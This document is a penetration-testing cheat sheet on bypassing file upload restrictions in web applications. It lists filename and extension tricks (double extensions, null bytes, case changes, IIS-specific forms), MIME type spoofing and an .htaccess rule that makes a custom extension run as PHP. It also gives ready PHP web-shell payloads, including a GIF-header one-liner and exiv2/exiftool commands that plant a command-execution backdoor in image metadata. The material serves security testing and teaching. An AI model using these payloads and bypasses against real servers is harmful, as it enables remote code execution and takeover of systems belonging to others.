# File Upload Bypass


## Basic

```
# Content-Type —> Change the parameter in the request header using Burp, ZAP etc.
# Put server executable extensions like file.php5, file.shtml, file.asa, file.cert
# Changing letters to capital form file.aSp or file.PHp3
# Using trailing spaces and/or dots at the end of the filename like file.asp… … . . .. .. , file.asp , file.asp.
# Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)
# Upload a file with 2 extensions—> file.php.jpg
# Use of null character—> file.asp%00.jpg
# Create a file with a forbidden extension —> file.asp:.jpg or file.asp::$data
# Combination of the above
```

## Bypassing Blacklists

Blacklisting is a type of protection where certain strings of data, in many cases, specific extensions, are explicitly prohibited from being sent to the web app server.

```
#php phtml  --> .php, .php3, .php4, .php5, .php6, .pht, .pHp, .Php, .phP
#asp	       --> .asp, .aspx
#perl	     --> .pl, .pm, .cgi, .lib
#jsp	       --> .jsp, .jspx, .jsw, .jsv, and .jspf
#Coldfusion --> .cfm, .cfml, .cfc, .dbm
```

## Bypassing File Upload Restrictions
```
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98 --> GIF89a; <?php system($_GET['cmd']); ?>) 
payload.php%00.jpg OR payload.php\x00.jpg
file.jpg with php backdoor in exif (see below)
.jpg -> proxy intercept -> rename to .php
```

## Injecting PHP into JPEG

```
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool "-comment<=back.php" back.png
```

## Uploading .htaccess to interpret .evil as .php

This will tell .htaccess that .evil allows php to be uploaded and not filtered anymore!

```
AddType application/x-httpd-php .evil
```

## MIME Type
Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type. Normal php MIME type:

```
Content-type: application/x-php
```

Replace with:

```
Content-type: image/jpeg
```
